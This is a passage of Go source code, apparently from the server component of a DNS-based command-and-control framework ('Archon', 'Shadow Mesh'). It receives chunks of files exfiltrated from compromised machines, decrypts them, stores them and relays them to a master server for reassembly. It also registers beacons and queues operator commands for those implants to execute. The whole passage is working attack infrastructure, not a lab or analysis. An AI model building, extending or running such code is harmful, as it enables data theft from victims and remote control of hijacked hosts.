					logf("[Exfil] Master rejected orphan chunk tag=%s idx=%d: %v - buffering for retry", frame.SessionTag, frame.Counter, err)
				}
			} else if c2.debug {
				logf("[Exfil] Failed to decrypt orphan chunk tag=%s: %v - buffering", frame.SessionTag, decryptErr)
			}
		}

		// Buffer the chunk - it will be processed when metadata arrives
		// NACK so the client retries — buffer is in-memory only, lost on restart
		c2.enqueuePendingLabelChunk(frame, clientIP)
		if c2.debug {
			logf("[Exfil] buffered frame tag=%s idx=%d awaiting metadata (NACK to force retry)", frame.SessionTag, frame.Counter)
		}
		return false, nil
	}

	meta := c2.buildMetadataFromTracker(tracker, frame.Counter, frame.Flags)
	return c2.handleExfilChunk(frame.Payload, meta, clientIP, nil)
}

func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
	tracker, ok := c2.getExfilTagTracker(tag)
	if !ok || tracker.SessionID == 0 {
		// If we don't know the session, forward the completion tag to Master
		if masterClient != nil {
			if err := masterClient.MarkExfilCompleteByTag(tag); err == nil {
				if c2.debug {
					logf("[Exfil] Forwarded completion tag=%s to Master (unknown session locally)", tag)
				}
				return true, nil
			} else if c2.debug {
				logf("[Exfil] Failed to forward completion tag=%s: %v", tag, err)
			}
		}
		return false, fmt.Errorf("unknown exfil session for completion")
	}

	sessionID := fmt.Sprintf("%08x", tracker.SessionID)

	// Get session details for completion request
	// Try both exfilSessions (has full metadata) and tracker (has TotalChunks from init frame)
	c2.exfilMutex.RLock()
	session, exists := c2.exfilSessions[sessionID]
	var totalChunks int
	var fileName string
	var fileSize int64
	if exists {
		totalChunks = int(session.TotalChunks)
		fileName = session.FileName
		fileSize = int64(session.FileSize)
	}
	// Fallback to tracker's TotalChunks if session doesn't have it
	if totalChunks == 0 && tracker.TotalChunks > 0 {
		totalChunks = int(tracker.TotalChunks)
	}
	c2.exfilMutex.RUnlock()

	// Flush any unsynced chunks for this session before sending completion
	if c2.db != nil && masterClient != nil {
		c2.syncSessionChunksToMaster(sessionID, totalChunks)
	}

	// Forward completion to Master with full details - Master handles assembly
	if masterClient != nil {
		req := ExfilCompleteRequest{
			SessionID:   sessionID,
			TotalChunks: totalChunks,
			FileName:    fileName,
			FileSize:    fileSize,
		}
		if err := masterClient.MarkExfilComplete(req); err != nil {
			if c2.debug {
				logf("[Exfil] Failed to forward completion for session=%s: %v", sessionID, err)
			}
			// Try by tag as fallback
			masterClient.MarkExfilCompleteByTag(tag)
		} else if c2.debug {
			logf("[Exfil] Forwarded completion for session=%s (totalChunks=%d) to Master", sessionID, totalChunks)
		}
	}

	c2.deleteExfilTagTracker(tag)
	return true, nil
}

func (c2 *C2Manager) ensureExfilTagTrackerLocked(tag string, now time.Time) *ExfilTagTracker {
	normalized := normalizeExfilTag(tag)
	tracker, exists := c2.exfilTagIndex[normalized]
	if !exists {
		tracker = &ExfilTagTracker{
			Tag:          normalized,
			CreatedAt:    now,
			LastActivity: now,
		}
		c2.exfilTagIndex[normalized] = tracker
	} else {
		tracker.LastActivity = now
	}
	return tracker
}

func (c2 *C2Manager) getExfilTagTracker(tag string) (*ExfilTagTracker, bool) {
	normalized := normalizeExfilTag(tag)
	c2.exfilMutex.Lock()
	defer c2.exfilMutex.Unlock()
	tracker, exists := c2.exfilTagIndex[normalized]
	if !exists {
		return nil, false
	}
	tracker.LastActivity = time.Now()
	copyTracker := *tracker
	return &copyTracker, true
}

func (c2 *C2Manager) deleteExfilTagTracker(tag string) {
	c2.exfilMutex.Lock()
	normalized := normalizeExfilTag(tag)
	delete(c2.exfilTagIndex, normalized)
	delete(c2.metadataAssemblers, normalized)
	delete(c2.pendingLabelChunks, normalized)
	c2.exfilMutex.Unlock()
}

func normalizeExfilTag(tag string) string {
	return strings.ToUpper(tag)
}

func (m *metadataAssembler) addSegment(index uint32, segment []byte, isFinal bool) ([]byte, bool) {
	if m.segments == nil {
		m.segments = make(map[uint32][]byte)
	}
	if _, exists := m.segments[index]; !exists {
		m.segments[index] = append([]byte(nil), segment...)
	}
	if isFinal {
		idx := index
		m.finalIndex = &idx
	}
	if m.finalIndex == nil {
		return nil, false
	}
	finalIdx := *m.finalIndex
	var buf bytes.Buffer
	for i := uint32(0); i <= finalIdx; i++ {
		chunk, ok := m.segments[i]
		if !ok {
			return nil, false
		}
		buf.Write(chunk)
	}
	return buf.Bytes(), true
}

func (c2 *C2Manager) appendMetadataSegment(tag string, index uint32, segment []byte, isFinal bool) ([]byte, bool) {
	normalized := normalizeExfilTag(tag)
	c2.exfilMutex.Lock()
	assembler, exists := c2.metadataAssemblers[normalized]
	if !exists {
		assembler = &metadataAssembler{}
		c2.metadataAssemblers[normalized] = assembler
	}
	payload, complete := assembler.addSegment(index, segment, isFinal)
	if complete {
		delete(c2.metadataAssemblers, normalized)
	}
	c2.exfilMutex.Unlock()
	return payload, complete
}

func (c2 *C2Manager) enqueuePendingLabelChunk(frame *ExfilFrame, clientIP string) {
	normalized := normalizeExfilTag(frame.SessionTag)
	c2.exfilMutex.Lock()
	c2.pendingLabelChunks[normalized] = append(c2.pendingLabelChunks[normalized], pendingLabelChunk{
		payload:  frame.Payload,
		counter:  frame.Counter,
		flags:    frame.Flags,
		clientIP: clientIP,
	})
	c2.exfilMutex.Unlock()
}

func (c2 *C2Manager) flushPendingLabelChunks(tag string) {
	tracker, ok := c2.getExfilTagTracker(tag)
	if !ok || tracker.SessionID == 0 {
		return
	}
	pending := c2.drainPendingLabelChunks(tag)
	for _, chunk := range pending {
		meta := c2.buildMetadataFromTracker(tracker, chunk.counter, chunk.flags)
		if _, err := c2.handleExfilChunk(chunk.payload, meta, chunk.clientIP, nil); err != nil && c2.debug {
			logf("[Exfil] failed to process buffered chunk tag=%s idx=%d: %v", tag, chunk.counter, err)
		}
	}
}

func (c2 *C2Manager) drainPendingLabelChunks(tag string) []pendingLabelChunk {
	normalized := normalizeExfilTag(tag)
	c2.exfilMutex.Lock()
	defer c2.exfilMutex.Unlock()
	pending := c2.pendingLabelChunks[normalized]
	if len(pending) > 0 {
		delete(c2.pendingLabelChunks, normalized)
	}
	return pending
}

func (c2 *C2Manager) buildMetadataFromTracker(tracker *ExfilTagTracker, counter uint32, flags uint8) *ExfilMetadata {
	meta := &ExfilMetadata{
		Version:     ExfilProtocolVersion,
		SessionID:   tracker.SessionID,
		JobID:       tracker.JobID,
		ChunkIndex:  counter,
		TotalChunks: tracker.TotalChunks,
	}
	// Don't try to guess TotalChunks from counter - it would be wrong
	// Only set final flag based on explicit flags from the frame envelope
	if flags&FrameEnvelopeFlagFinal != 0 {
		meta.Flags |= ExfilFlagFinalChunk
	}
	return meta
}

func (c2 *C2Manager) cacheChunkInMemory(session *ExfilSession, chunkIndex uint32, data []byte) {
	c2.exfilMutex.Lock()
	defer c2.exfilMutex.Unlock()
	if session.PendingChunks == nil {
		session.PendingChunks = make(map[uint32][]byte)
	}
	session.PendingChunks[chunkIndex] = append([]byte(nil), data...)
}

// handleExfilChunk ingests a dedicated exfil client's chunk and forwards to Master.
// DNS server does NOT assemble - Master handles all assembly.
func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string, plaintextOverride []byte) (bool, error) {
	var (
		plaintext []byte
		err       error
	)
	if plaintextOverride != nil {
		plaintext = plaintextOverride
	} else {
		plaintext, err = decodeAndDecryptBytes(encoded, c2.aesKey)
		if err != nil {
			// Fallback: try plain base36 decode (unencrypted exfil client)
			if plain, b36Err := base36Decode(strings.ToLower(encoded)); b36Err == nil && len(plain) > 0 {
				plaintext = plain
			} else {
				return false, fmt.Errorf("exfil decrypt failed: %w", err)
			}
		}
	}

	if meta.PayloadLen != 0 && int(meta.PayloadLen) != len(plaintext) && c2.debug {
		logf("[Exfil] Payload length mismatch (expected %d, got %d)", meta.PayloadLen, len(plaintext))
	}

	sessionID := fmt.Sprintf("%08x", meta.SessionID)
	jobID := fmt.Sprintf("%08x", meta.JobID)
	session := c2.ensureExfilSession(sessionID, jobID, clientIP)

	if meta.IsHeader() || meta.ChunkIndex == ExfilHeaderChunkIndex {
		c2.handleExfilHeader(session, meta, plaintext)
		if c2.debug {
			logf("[Exfil] header session=%s job=%s name=%s size=%d chunks=%d", sessionID, jobID, session.FileName, session.FileSize, session.TotalChunks)
		}
		return true, nil
	}

	// Capture session fields under lock for use outside lock
	c2.exfilMutex.Lock()
	if session.TotalChunks == 0 && meta.TotalChunks != 0 {
		session.TotalChunks = meta.TotalChunks
	}
	session.LastActivity = time.Now()
	// Capture values for forwarding (avoid race with goroutine)
	totalChunks := session.TotalChunks
	fileName := session.FileName
	fileSize := session.FileSize
	c2.exfilMutex.Unlock()

	// Persist locally for retry capability (in case Master is temporarily unavailable)
	// CRITICAL: Only ACK if local persist succeeds - this ensures retries work
	localPersisted := false
	if c2.db != nil {
		if _, dbErr := c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext); dbErr != nil {
			logf("[Exfil] DB persist failed (session=%s idx=%d): %v - NACK to trigger retry", sessionID, meta.ChunkIndex, dbErr)
			// Don't ACK if we couldn't persist - client will retry
			return false, fmt.Errorf("local persist failed: %w", dbErr)
		}
		localPersisted = true
	}

	if c2.debug {
		logf("[Exfil] chunk session=%s idx=%d/%d bytes=%d - forwarding to Master", sessionID, meta.ChunkIndex, totalChunks, len(plaintext))
	}

	// Forward to Master asynchronously - Master handles deduplication and assembly
	// We ACK based on local persist, not Master success (async retry handles Master failures)
	if masterClient != nil && localPersisted {
		// Build request with captured values (no race)
		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  int(meta.ChunkIndex),
			TotalChunks: int(totalChunks),
			PayloadB64:  base64.StdEncoding.EncodeToString(plaintext),
			FileName:    fileName,
			FileSize:    int64(fileSize),
			IsFinal:     meta.IsFinal(),
		}
		go c2.submitExfilChunkToMasterDirect(req, sessionID, int(meta.ChunkIndex))
	}

	return localPersisted, nil
}

func (c2 *C2Manager) ensureExfilSession(sessionID, jobID, clientIP string) *ExfilSession {
	now := time.Now()
	c2.exfilMutex.Lock()
	defer c2.exfilMutex.Unlock()

	session, exists := c2.exfilSessions[sessionID]
	if !exists {
		session = &ExfilSession{
			SessionID:      sessionID,
			JobID:          jobID,
			ClientIP:       clientIP,
			Status:         "receiving",
			CreatedAt:      now,
			LastActivity:   now,
			ReceivedChunks: make(map[uint32]bool),
		}
		c2.exfilSessions[sessionID] = session
	} else {
		if session.JobID == "" && jobID != "" {
			session.JobID = jobID
		}
		if session.ClientIP == "" {
			session.ClientIP = clientIP
		}
		session.LastActivity = now
		if session.ReceivedChunks == nil {
			session.ReceivedChunks = make(map[uint32]bool)
		}
	}

	return session
}

func (c2 *C2Manager) handleExfilHeader(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
	c2.exfilMutex.Lock()
	if meta != nil {
		if meta.Name != "" {
			session.FileName = meta.Name
		}
		if meta.FileSize != 0 {
			session.FileSize = meta.FileSize
		}
		if meta.TotalChunks != 0 {
			session.TotalChunks = meta.TotalChunks
		}
	}
	if len(payload) > 0 {
		session.Note = string(payload)
	}
	if session.Status == "" {
		session.Status = "receiving"
	}
	session.LastActivity = time.Now()
	// Capture values for forwarding to Master
	totalChunks := session.TotalChunks
	fileName := session.FileName
	fileSize := session.FileSize
	sessionID := session.SessionID
	jobID := session.JobID
	c2.exfilMutex.Unlock()

	c2.persistExfilSession(session)

	// SHADOW MESH: Forward header metadata to Master so it knows totalChunks
	// This is critical because other DNS servers may receive data chunks without metadata
	if masterClient != nil && totalChunks > 0 {
		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  0, // Header is chunk 0
			TotalChunks: int(totalChunks),
			FileName:    fileName,
			FileSize:    int64(fileSize),
			PayloadB64:  "", // Header has no data payload for Master
		}
		go func() {
			if _, err := masterClient.SubmitExfilChunk(req); err != nil && c2.debug {
				logf("[Exfil] Failed to forward header metadata to Master: %v", err)
			}
		}()
	}
}

func (c2 *C2Manager) persistExfilSession(session *ExfilSession) {
	if c2.db == nil || session == nil {
		return
	}

	c2.exfilMutex.RLock()
	record := &ExfilSessionRecord{
		SessionID:      session.SessionID,
		JobID:          session.JobID,
		FileName:       session.FileName,
		FileSize:       int64(session.FileSize),
		TotalChunks:    int(session.TotalChunks),
		ReceivedChunks: session.ReceivedCount,
		Status:         session.Status,
		Note:           session.Note,
		ClientIP:       session.ClientIP,
		CreatedAt:      session.CreatedAt,
		UpdatedAt:      time.Now(),
		LastChunkAt:    session.LastChunkAt,
	}
	c2.exfilMutex.RUnlock()
	if record.Status == "" {
		record.Status = "receiving"
	}
	if err := c2.db.UpsertExfilSession(record); err != nil && c2.debug {
		logf("[Exfil] Failed to persist session %s: %v", record.SessionID, err)
	}
}

func (c2 *C2Manager) submitExfilChunkToMasterDirect(req ExfilChunkRequest, sessionID string, chunkIndex int) {
	if masterClient == nil {
		return
	}

	_, err := masterClient.SubmitExfilChunk(req)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", chunkIndex, sessionID, err)
		}
		return
	}

	// Mark as synced in DB
	if c2.db != nil {
		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
		}
	}
}

// syncSessionChunksToMaster syncs all unsynced chunks for a specific session to Master.
// Called before sending completion to ensure all chunks are delivered.
func (c2 *C2Manager) syncSessionChunksToMaster(sessionID string, totalChunks int) {
	if c2.db == nil || masterClient == nil {
		return
	}

	chunks, err := c2.db.GetUnsyncedExfilChunksForSession(sessionID, totalChunks)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to query unsynced chunks for session %s: %v", sessionID, err)
		}
		return
	}

	if len(chunks) == 0 {
		return
	}

	if c2.debug {
		logf("[Exfil] Syncing %d unsynced chunks for session %s before completion", len(chunks), sessionID)
	}

	for _, chunk := range chunks {
		chunkIndex := chunk["chunk_index"].(int)
		data := chunk["data"].([]byte)
		jobID := chunk["job_id"].(string)
		fileName := chunk["file_name"].(string)
		fileSize := chunk["file_size"].(int64)
		chunkTotalChunks := chunk["total_chunks"].(int)

		req := ExfilChunkRequest{
			SessionID:   sessionID,
			JobID:       jobID,
			ChunkIndex:  chunkIndex,
			TotalChunks: chunkTotalChunks,
			PayloadB64:  base64.StdEncoding.EncodeToString(data),
			FileName:    fileName,
			FileSize:    fileSize,
			IsFinal:     chunkTotalChunks > 0 && chunkIndex == chunkTotalChunks-1,
		}

		if _, err := masterClient.SubmitExfilChunk(req); err != nil {
			if c2.debug {
				logf("[Exfil] Failed to sync chunk %d for session %s: %v", chunkIndex, sessionID, err)
			}
			continue
		}

		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
		}
	}
}

func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
	if masterClient == nil || session == nil || meta == nil {
		return
	}

	c2.exfilMutex.RLock()
	req := ExfilChunkRequest{
		SessionID:   session.SessionID,
		JobID:       session.JobID,
		ChunkIndex:  int(meta.ChunkIndex),
		TotalChunks: int(session.TotalChunks),
		PayloadB64:  base64.StdEncoding.EncodeToString(payload),
		FileName:    session.FileName,
		FileSize:    int64(session.FileSize),
		IsFinal:     meta.IsFinal(),
	}
	c2.exfilMutex.RUnlock()

	_, err := masterClient.SubmitExfilChunk(req)
	if err != nil {
		if c2.debug {
			logf("[Exfil] Failed to forward chunk %d for session %s: %v - will retry from disk", meta.ChunkIndex, session.SessionID, err)
		}
		return
	}

	// Mark as synced in DB
	if c2.db != nil {
		if err := c2.db.MarkExfilChunkSynced(session.SessionID, int(meta.ChunkIndex)); err != nil && c2.debug {
			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", session.SessionID, meta.ChunkIndex, err)
		}
	}
}

// retryPendingExfilChunks periodically retries sending pending exfil chunks to Master
func (c2 *C2Manager) retryPendingExfilChunks() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// 1. Retry in-memory chunks (failed to write to DB)
		c2.retryInMemoryChunks()

		if c2.db == nil || masterClient == nil {
			continue
		}

		// 2. Retry unsynced chunks from DB (failed to send to Master)
		// Get unsynced chunks from DB (limit 50 per batch to avoid memory spikes)
		chunks, err := c2.db.GetUnsyncedExfilChunks(50)
		if err != nil {
			if c2.debug {
				logf("[Exfil] Failed to query unsynced chunks: %v", err)
			}
			continue
		}

		if len(chunks) == 0 {
			continue
		}

		if c2.debug {
			logf("[Exfil] Retrying %d unsynced chunks from disk", len(chunks))
		}

		for _, chunk := range chunks {
			sessionID := chunk["session_id"].(string)
			chunkIndex := chunk["chunk_index"].(int)
			data := chunk["data"].([]byte)
			jobID := chunk["job_id"].(string)
			fileName := chunk["file_name"].(string)
			fileSize := chunk["file_size"].(int64)
			totalChunks := chunk["total_chunks"].(int)

			req := ExfilChunkRequest{
				SessionID:   sessionID,
				JobID:       jobID,
				ChunkIndex:  chunkIndex,
				TotalChunks: totalChunks,
				PayloadB64:  base64.StdEncoding.EncodeToString(data),
				FileName:    fileName,
				FileSize:    fileSize,
				IsFinal:     totalChunks > 0 && chunkIndex == totalChunks-1,
			}

			completed, err := masterClient.SubmitExfilChunk(req)
			if err != nil {
				if c2.debug {
					logf("[Exfil] Retry Master forward failed (session=%s idx=%d): %v", sessionID, chunkIndex, err)
				}
				continue // Will be picked up next time
			}

			// Mark as synced
			if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil {
				logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
			}

			if completed {
				// If master says completed, we should finalize locally too
				c2.exfilMutex.RLock()
				session, exists := c2.exfilSessions[sessionID]
				c2.exfilMutex.RUnlock()
				if exists {
					go c2.finalizeExfilSession(session)
				}
			}
		}
	}
}

// retryInMemoryChunks attempts to persist chunks that failed to write to DB
func (c2 *C2Manager) retryInMemoryChunks() {
	// Collect sessions with pending chunks to avoid holding lock while processing
	c2.exfilMutex.RLock()
	var sessionsWithPending []*ExfilSession
	for _, session := range c2.exfilSessions {
		if len(session.PendingChunks) > 0 {
			sessionsWithPending = append(sessionsWithPending, session)
		}
	}
	c2.exfilMutex.RUnlock()

	for _, session := range sessionsWithPending {
		c2.processSessionPendingChunks(session)
	}
}

// processSessionPendingChunks attempts to process pending chunks for a session
func (c2 *C2Manager) processSessionPendingChunks(session *ExfilSession) {
	c2.exfilMutex.Lock()
	// Copy pending chunks to avoid holding lock during network ops
	pending := make(map[uint32][]byte)
	for k, v := range session.PendingChunks {
		pending[k] = v
	}
	c2.exfilMutex.Unlock()

	if len(pending) == 0 {
		return
	}

	if c2.debug {
		logf("[Exfil] Retrying %d pending in-memory chunks for session %s", len(pending), session.SessionID)
	}

	for idx, data := range pending {
		success := false

		// 1. Try to persist to DB first
		if c2.db != nil {
			inserted, err := c2.db.RecordExfilChunk(session.SessionID, idx, data)
			if err == nil {
				success = true
				// If inserted (new) or already exists, we consider it "safe" on disk.
				// It will be picked up by the DB retry loop (GetUnsyncedExfilChunks)
				// because RecordExfilChunk inserts with synced=0.
				if !inserted && c2.debug {
					logf("[Exfil] Chunk %d for session %s already on disk", idx, session.SessionID)
				}
			} else if c2.debug {
				logf("[Exfil] Retry DB persist failed (session=%s idx=%d): %v", session.SessionID, idx, err)
			}
		}

		// 2. If DB is unavailable or failed, try Master directly (fallback)
		if !success && masterClient != nil {
			c2.exfilMutex.RLock()
			req := ExfilChunkRequest{
				SessionID:   session.SessionID,
				JobID:       session.JobID,
				ChunkIndex:  int(idx),
				TotalChunks: int(session.TotalChunks),
				PayloadB64:  base64.StdEncoding.EncodeToString(data),
				FileName:    session.FileName,
				FileSize:    int64(session.FileSize),
				IsFinal:     session.TotalChunks > 0 && idx == session.TotalChunks-1,
			}
			c2.exfilMutex.RUnlock()

			completed, err := masterClient.SubmitExfilChunk(req)
			if err == nil {
				success = true
				if completed {
					go c2.finalizeExfilSession(session)
				}
			} else if c2.debug {
				logf("[Exfil] Retry Master forward failed (session=%s idx=%d): %v", session.SessionID, idx, err)
			}
		}

		if success {
			c2.exfilMutex.Lock()
			delete(session.PendingChunks, idx)
			c2.exfilMutex.Unlock()
		}
	}
}

// finalizeExfilSession marks a session as complete locally and notifies Master
func (c2 *C2Manager) finalizeExfilSession(session *ExfilSession) {
	c2.exfilMutex.Lock()
	if session.Status == "completed" {
		c2.exfilMutex.Unlock()
		return
	}
	session.Status = "completed"
	session.LastActivity = time.Now()
	c2.exfilMutex.Unlock()

	c2.persistExfilSession(session)

	// Notify Master to trigger artifact assembly
	if masterClient != nil {
		go func(s *ExfilSession) {
			req := ExfilCompleteRequest{
				DNSServerID: masterClient.serverID,
				APIKey:      masterClient.apiKey,
				SessionID:   s.SessionID,
				TotalChunks: int(s.TotalChunks),
			}
			if err := masterClient.MarkExfilComplete(req); err != nil {
				if c2.debug {
					logf("[Exfil] Failed to notify Master of completion for session %s: %v", s.SessionID, err)
				}
			} else if c2.debug {
				logf("[Exfil] Notified Master of completion for session %s", s.SessionID)
			}
		}(session)
	}

	if c2.debug {
		logf("[Exfil] Finalized session %s (local status=completed)", session.SessionID)
	}
}

// GetKnownDomains returns the list of active domains
func (c2 *C2Manager) GetKnownDomains() []string {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()
	return append([]string(nil), c2.knownDomains...)
}

// SetKnownDomains updates the list of active domains
func (c2 *C2Manager) SetKnownDomains(domains []string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	c2.knownDomains = domains
}

// UpdateBuildFormats stores payload formats from Archon build configs so the
// server can decode formatted CHK queries from brand-new beacons.
func (c2 *C2Manager) UpdateBuildFormats(formats []string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	for _, f := range formats {
		if f != "" {
			c2.buildFormats[f] = true
		}
	}
}

func (c2 *C2Manager) UpdateBuildPhaseConfigs(configs map[string]*BeaconPhaseConfig) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	for buildID, pc := range configs {
		c2.buildPhaseConfigs[buildID] = pc
	}
	// Also apply to any existing beacons that don't have PhaseConfig yet
	for _, beacon := range c2.beacons {
		if beacon.PhaseConfig == nil {
			if key := beacon.buildConfigKey(); key != "" {
				if pc, ok := c2.buildPhaseConfigs[key]; ok {
					beacon.PhaseConfig = pc
				}
			}
		}
	}
}

// SetBeaconPhaseConfig safely applies a phase config to a beacon under lock.
// Used by ReportBeacon goroutine to feed back config from Archon without racing.
func (c2 *C2Manager) SetBeaconPhaseConfig(beaconID string, pc *BeaconPhaseConfig) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	if beacon, exists := c2.beacons[beaconID]; exists && beacon.PhaseConfig == nil {
		beacon.PhaseConfig = pc
	}
}

// GetBeacons returns a list of all registered beacons
func (c2 *C2Manager) GetBeacons() []*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	beacons := make([]*Beacon, 0, len(c2.beacons))
	for _, b := range c2.beacons {
		beacons = append(beacons, b)
	}
	return beacons
}

// AddDomainUpdateTask adds a task to update domains for a beacon
func (c2 *C2Manager) AddDomainUpdateTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate a unique ID for domain update tasks (D prefix)
	c2.domainTaskCounter++
	taskID := fmt.Sprintf("D%04d", c2.domainTaskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
	}

	// Persist task
	if c2.db != nil {
		go func() {
			if err := c2.db.SaveTask(task); err != nil && c2.debug {
				logf("[DB] Failed to save domain task: %v", err)
			}
		}()
	}

	return taskID
}

// AddTaskFromMaster adds a task received from the Master Server, uses Master's TaskID
func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Check if we already have this task (deduplication)
	if existingTask, exists := c2.tasks[masterTaskID]; exists {
		// True duplicate: same beacon, same command, and task is still pending or in-flight
		if existingTask.BeaconID == beaconID && existingTask.Command == command {
			return
		}
		// Stale task from a previous session (e.g., Archon DB was recreated while
		// DNS server kept its local DB, causing task ID collision).
		// Clean up the old entry and fall through to replace with fresh task from master.
		if oldBeacon, ok := c2.beacons[existingTask.BeaconID]; ok {
			newQueue := make([]Task, 0, len(oldBeacon.TaskQueue))
			for _, t := range oldBeacon.TaskQueue {
				if t.ID != masterTaskID {
					newQueue = append(newQueue, t)
				}
			}
			oldBeacon.TaskQueue = newQueue
		}
		delete(c2.tasks, masterTaskID)
		delete(c2.tasksInProgress, masterTaskID)
	}

	// Check if this task is already in progress (delivered by this or another server)
	if _, inProgress := c2.tasksInProgress[masterTaskID]; inProgress {
		return
	}

	// SHADOW MESH: Use Master's task ID directly - all DNS servers will have the same ID
	// This replaces the old local task counter approach that caused ID mismatches
	c2.masterTaskIDs[masterTaskID] = masterTaskID

	task := &Task{
		ID:        masterTaskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[masterTaskID] = task

	if beacon, exists := c2.beacons[beaconID]; exists {
		// Append a copy of the task value, but updates to c2.tasks[masterTaskID]
		// will be the authoritative source for status changes
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
	}

	// Persist task
	if c2.db != nil {
		go func() {
			if err := c2.db.SaveTask(task); err != nil && c2.debug {
				logf("[DB] Failed to save Archon task: %v", err)
			}
		}()
	}
}

// SyncBeaconFromMaster updates a beacon from Master Server data
func (c2 *C2Manager) SyncBeaconFromMaster(data BeaconData) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	beacon, exists := c2.beacons[data.ID]
	if !exists {
		beacon = &Beacon{
			ID:            data.ID,
			Hostname:      data.Hostname,
			Username:      data.Username,
			OS:            data.OS,
			Arch:          data.Arch,
			IPAddress:     data.IPAddress,
			FirstSeen:     data.FirstSeen,
			LastSeen:      data.LastSeen,
			BeaconName:    data.BeaconName,
			BuildID:       data.BuildID,
			PayloadFormat: data.PayloadFormat,
			Encoding:      data.Encoding,
			TaskQueue:     []Task{},
		}
		if key := beacon.buildConfigKey(); key != "" {
			if pc, ok := c2.buildPhaseConfigs[key]; ok {
				beacon.PhaseConfig = pc
			}
		}
		c2.beacons[data.ID] = beacon

		// Backfill any pending tasks that arrived before this beacon was synced
		for _, task := range c2.tasks {
			if task.BeaconID == data.ID && task.Status == "pending" {
				beacon.TaskQueue = append(beacon.TaskQueue, *task)
			}
		}

		// Persist new beacon
		if c2.db != nil {
			go func(b *Beacon) {
				if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
					logf("[DB] Failed to save synced beacon: %v", err)
				}
			}(beacon)
		}
	} else {
		// Update existing beacon if Master has newer info
		if data.LastSeen.After(beacon.LastSeen) {
			beacon.LastSeen = data.LastSeen
			beacon.IPAddress = data.IPAddress
		}
		if data.PayloadFormat != "" && beacon.PayloadFormat == "" {
			beacon.PayloadFormat = data.PayloadFormat
		}
		if data.Encoding != "" && beacon.Encoding == "" {
			beacon.Encoding = data.Encoding
		}
		if data.BeaconName != "" && beacon.BeaconName == "" {
			beacon.BeaconName = data.BeaconName
		}
		if data.BuildID != "" && beacon.BuildID == "" {
			beacon.BuildID = data.BuildID
		}
		if beacon.PhaseConfig == nil {
			if key := beacon.buildConfigKey(); key != "" {
				if pc, ok := c2.buildPhaseConfigs[key]; ok {
					beacon.PhaseConfig = pc
				}
			}
		}

		// Persist update
		if c2.db != nil {
			go func(b *Beacon) {
				if err := c2.db.UpdateBeaconStatus(b.ID, "active"); err != nil && c2.debug {
					logf("[DB] Failed to update synced beacon: %v", err)
				}
			}(beacon)
		}
	}
}

// UpdateTaskStatusFromMaster updates a task status based on Master Server data
// SHADOW MESH FIX: Task ID is now the master ID directly, no lookup needed
func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// SHADOW MESH: Task ID IS the master ID now - direct lookup
	task, exists := c2.tasks[masterTaskID]
	if !exists {
		return
	}

	// Update status
	if task.Status != status {
		oldStatus := task.Status
		task.Status = status

		// Remove from beacon's TaskQueue when task is no longer deliverable:
		// another server sent it (pending→sent), or results arrived (sent→completed/failed)
		if status == "completed" || status == "failed" || (oldStatus == "pending" && status == "sent") {
			if beacon, ok := c2.beacons[task.BeaconID]; ok {
				// Remove task from queue
				newQueue := make([]Task, 0, len(beacon.TaskQueue))
				for _, t := range beacon.TaskQueue {
					if t.ID != masterTaskID {
						newQueue = append(newQueue, t)
					}
				}
				if len(newQueue) != len(beacon.TaskQueue) {
					beacon.TaskQueue = newQueue
					if c2.debug {
						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)",
							masterTaskID, task.BeaconID, status)
					}
				}
			}
			// Also mark in tasksInProgress to prevent re-delivery if queued again
			c2.tasksInProgress[masterTaskID] = time.Now()
		}

		// If completed/failed, clear from beacon's current task
		if status == "completed" || status == "failed" {
			if beacon, ok := c2.beacons[task.BeaconID]; ok && beacon.CurrentTask == masterTaskID {
				beacon.CurrentTask = ""
			}
		}

		// Persist update
		if c2.db != nil {
			go func(tid, s string) {
				if err := c2.db.UpdateTaskStatus(tid, s); err != nil && c2.debug {
					logf("[DB] Failed to update task status: %v", err)
				}
			}(masterTaskID, status)
		}
	}
}

